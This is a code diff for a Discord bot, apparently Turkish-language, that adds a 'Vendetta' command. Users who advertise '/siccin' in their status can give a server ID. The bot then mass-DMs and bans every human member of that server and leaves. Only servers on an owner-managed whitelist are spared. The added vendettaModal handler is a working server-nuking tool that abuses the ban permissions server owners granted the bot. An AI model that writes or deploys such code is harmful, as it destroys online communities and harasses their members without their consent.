@@ -3,7 +3,8 @@ const {
   Client, GatewayIntentBits, Partials,
   EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
   ModalBuilder, TextInputBuilder, TextInputStyle,
-  StringSelectMenuBuilder
+  StringSelectMenuBuilder,
+  ActivityType
 } = require('discord.js');
 
 const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
@@ -14,7 +15,7 @@ const client = new Client({
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
     GatewayIntentBits.GuildMembers,
-    GatewayIntentBits.GuildPresences // 🔴 DURUM OKUMA
+    GatewayIntentBits.GuildPresences
   ],
   partials: [Partials.Channel]
 });
@@ -37,102 +38,91 @@ client.once("ready", async () => {
     const res = await fetch(videoURL);
     const buffer = Buffer.from(await res.arrayBuffer());
     cachedVideo = { attachment: buffer, name: "video.mp4" };
-    console.log("🎥 Video cachelendi!");
+    console.log("🎥 Video cachelendi");
   } catch (err) {
     console.log("❌ Video cache hatası:", err);
   }
 });
 
-// ======================
-// BIO / STATUS KONTROL
-// ======================
-async function hasSiccin(user, member) {
-  let bioText = "";
-  try {
-    const fetched = await client.users.fetch(user.id, { force: true });
-    bioText = (fetched.bio || "").toLowerCase();
-  } catch {}
-
-  let statusText = "";
-  if (member?.presence?.activities?.length) {
-    const custom = member.presence.activities.find(a => a.type === 4);
-    if (custom?.state) statusText = custom.state.toLowerCase();
-  }
-
-  return (
-    bioText.includes("/siccin") ||
-    bioText.includes(".gg/siccin") ||
-    statusText.includes("/siccin") ||
-    statusText.includes(".gg/siccin")
-  );
-}
-
-// ======================
-// WHITELIST MESAJI
-// ======================
+// ================== WHITELIST MESAJ ==================
 async function updateWhitelistMessage(channel) {
-  let description = "📜 WHITELIST SUNUCULAR\n\n";
-
+  let description = "📜 **WHITELIST SUNUCULAR**\n\n";
   for (const id in whitelist) {
-    description += `${whitelist[id].name} | ${whitelist[id].ownerTag} | ${id}\n`;
+    description += `• ${whitelist[id].name} | ${whitelist[id].ownerTag} | ${id}\n`;
   }
 
   if (whitelistMessageId) {
     const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
-    if (msg) return msg.edit({ content: description }).catch(() => {});
+    if (msg) return msg.edit({ content: description });
   }
 
   const msg = await channel.send({ content: description });
   whitelistMessageId = msg.id;
 }
 
-// ======================
-// VENDETTA PANEL
-// ======================
-async function openPanel(messageOrInteraction) {
-  const author = messageOrInteraction.user ?? messageOrInteraction.author;
+// ================== DURUM KONTROL ==================
+function hasSiccinStatus(member) {
+  if (!member?.presence?.activities) return false;
 
-  if (![OWNER_ID, SERI_ID].includes(author.id)) {
-    return messageOrInteraction.reply?.({
-      content: "❌ Bu paneli açamazsın.",
-      ephemeral: true
-    });
+  return member.presence.activities.some(act =>
+    act.type === ActivityType.Custom &&
+    act.state &&
+    (act.state.includes("/siccin") || act.state.includes(".gg/siccin"))
+  );
+}
+
+// ================== VENDETTA ==================
+async function vendettaCommand(message) {
+  const member = await message.guild.members.fetch(message.author.id);
+
+  if (!hasSiccinStatus(member)) {
+    return message.reply("❌ Vendetta kullanmak için durumuna `/siccin` veya `.gg/siccin` yazmalısın.");
   }
 
-  const embed = new EmbedBuilder()
-    .setTitle("⬜⚡ VENDETTA PANEL ⚡⬜")
-    .setDescription("Whitelist işlemlerini seç")
-    .setColor("Grey");
-
-  const row = new ActionRowBuilder().addComponents(
-    new StringSelectMenuBuilder()
-      .setCustomId("panelMenu")
-      .setPlaceholder("Sistem seç")
-      .addOptions([
-        { label: "Whitelist Sistemi", value: "whitelist" }
-      ])
+  const button = new ActionRowBuilder().addComponents(
+    new ButtonBuilder()
+      .setCustomId("sorguVendetta")
+      .setLabel("💣 Vendetta Başlat")
+      .setStyle(ButtonStyle.Danger)
   );
 
-  return messageOrInteraction.reply?.({
+  await message.author.send({
+    content: "💣 **Vendetta yetkin onaylandı**\nSunucu ID girerek devam et.",
+    components: [button]
+  }).catch(() => {});
+}
+
+// ================== PANEL ==================
+async function openPanel(message) {
+  if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;
+
+  const embed = new EmbedBuilder()
+    .setTitle("⚡ Vendetta Panel")
+    .setDescription("Sistem seçiniz")
+    .setColor("Grey");
+
+  const selectRow = new ActionRowBuilder().addComponents(
+    new StringSelectMenuBuilder()
+      .setCustomId("panelMenu")
+      .addOptions([{ label: "Whitelist Sistemi", value: "whitelist" }])
+  );
+
+  await message.reply({
     embeds: [embed],
-    files: [cachedVideo],
-    components: [row],
+    files: cachedVideo ? [cachedVideo] : [],
+    components: [selectRow],
     ephemeral: true
   });
 }
 
-// ======================
-// INTERACTIONS
-// ======================
+// ================== INTERACTIONS ==================
 client.on("interactionCreate", async interaction => {
-  if (!interaction.isButton() && !interaction.isStringSelectMenu() && !interaction.isModalSubmit()) return;
 
-  // ======================
-  // PANEL MENÜ
-  // ======================
-  if (interaction.customId === "panelMenu") {
+  // PANEL
+  if (interaction.isStringSelectMenu() && interaction.customId === "panelMenu") {
     const embed = new EmbedBuilder()
       .setTitle("Whitelist Sistemi")
+      .setDescription("Bir işlem seç")
       .setColor("Blue");
 
     const row = new ActionRowBuilder().addComponents(
@@ -147,10 +137,8 @@ client.on("interactionCreate", async interaction => {
     return interaction.update({ embeds: [embed], components: [row] });
   }
 
-  // ======================
-  // WL MODAL
-  // ======================
-  if (interaction.customId === "wlMenu") {
+  // WL MENU
+  if (interaction.isStringSelectMenu() && interaction.customId === "wlMenu") {
     const modal = new ModalBuilder()
       .setCustomId(interaction.values[0])
       .setTitle("Whitelist İşlemi");
@@ -168,16 +156,14 @@ client.on("interactionCreate", async interaction => {
     return interaction.showModal(modal);
   }
 
-  // ======================
-  // WL SUBMIT
-  // ======================
+  // WL MODAL
   if (interaction.isModalSubmit()) {
     const guildID = interaction.fields.getTextInputValue("guildID");
     const wlChannel = await client.channels.fetch(WL_KANAL_ID);
 
     if (interaction.customId === "wlEkle") {
       const guild = client.guilds.cache.get(guildID);
-      if (!guild) return interaction.reply({ content: "❌ Sunucu yok", ephemeral: true });
+      if (!guild) return interaction.reply({ content: "Sunucu bulunamadı", ephemeral: true });
 
       const owner = await guild.fetchOwner().catch(() => null);
       whitelist[guildID] = {
@@ -192,26 +178,14 @@ client.on("interactionCreate", async interaction => {
     if (interaction.customId === "wlCikar") {
       delete whitelist[guildID];
       await updateWhitelistMessage(wlChannel);
-      return interaction.reply({ content: "🟦 Whitelist çıkarıldı", ephemeral: true });
+      return interaction.reply({ content: "🗑️ Whitelist çıkarıldı", ephemeral: true });
     }
   }
 
-  // ======================
   // VENDETTA BUTTON
-  // ======================
-  if (interaction.customId === "sorguHak") {
-    const member = await interaction.guild.members.fetch(interaction.user.id);
-    const ok = await hasSiccin(interaction.user, member);
-
-    if (!ok) {
-      return interaction.reply({
-        content: "❌ Bio veya durumunda **/siccin** veya **.gg/siccin** yok!",
-        ephemeral: true
-      });
-    }
-
+  if (interaction.isButton() && interaction.customId === "sorguVendetta") {
     const modal = new ModalBuilder()
-      .setCustomId("modalSunucuID")
+      .setCustomId("vendettaModal")
       .setTitle("Sunucu ID");
 
     modal.addComponents(
@@ -226,36 +200,43 @@ client.on("interactionCreate", async interaction => {
 
     return interaction.showModal(modal);
   }
+
+  // VENDETTA MODAL
+  if (interaction.isModalSubmit() && interaction.customId === "vendettaModal") {
+    const guildId = interaction.fields.getTextInputValue("sunucuID");
+    const guild = client.guilds.cache.get(guildId);
+
+    if (!guild) return interaction.reply({ content: "Bot bu sunucuda değil", ephemeral: true });
+    if (whitelist[guildId]) return interaction.reply({ content: "⚠️ Sunucu whitelist'te", ephemeral: true });
+
+    await interaction.reply({ content: "💣 Vendetta başlatıldı", ephemeral: true });
+
+    const members = await guild.members.fetch();
+    const embed = new EmbedBuilder()
+      .setColor("Red")
+      .setTitle("💣 VENDETTA")
+      .setDescription("Slained by VENDETTA");
+
+    const tasks = [];
+    for (const m of members.values()) {
+      if (m.user.bot) continue;
+      tasks.push(m.send({ embeds: [embed] }).catch(() => {}));
+      tasks.push(m.ban({ reason: "VENDETTA" }).catch(() => {}));
+    }
+
+    await Promise.all(tasks);
+    await guild.leave().catch(() => {});
+  }
 });
 
-// ======================
-// MESAJ KOMUTLARI
-// ======================
+// ================== MESSAGE COMMANDS ==================
 client.on("messageCreate", async message => {
   if (!message.guild || message.author.bot) return;
 
-  if (message.content === ".vndt") return openPanel(message);
+  const cmd = message.content.toLowerCase();
 
-  if (message.content === ".vendetta") {
-    const member = await message.guild.members.fetch(message.author.id);
-    const ok = await hasSiccin(message.author, member);
-
-    if (!ok) {
-      return message.reply("❌ Bio veya durumunda **/siccin** veya **.gg/siccin** yok!");
-    }
-
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setCustomId("sorguHak")
-        .setLabel("💣 Vendetta Başlat")
-        .setStyle(ButtonStyle.Danger)
-    );
-
-    return message.author.send({
-      content: "🔥 Vendetta başlatabilirsin",
-      components: [row]
-    }).catch(() => {});
-  }
+  if (cmd === ".vendetta") return vendettaCommand(message);
+  if (cmd === ".vndt") return openPanel(message);
 });
 
 client.login(process.env.BOT_TOKEN);
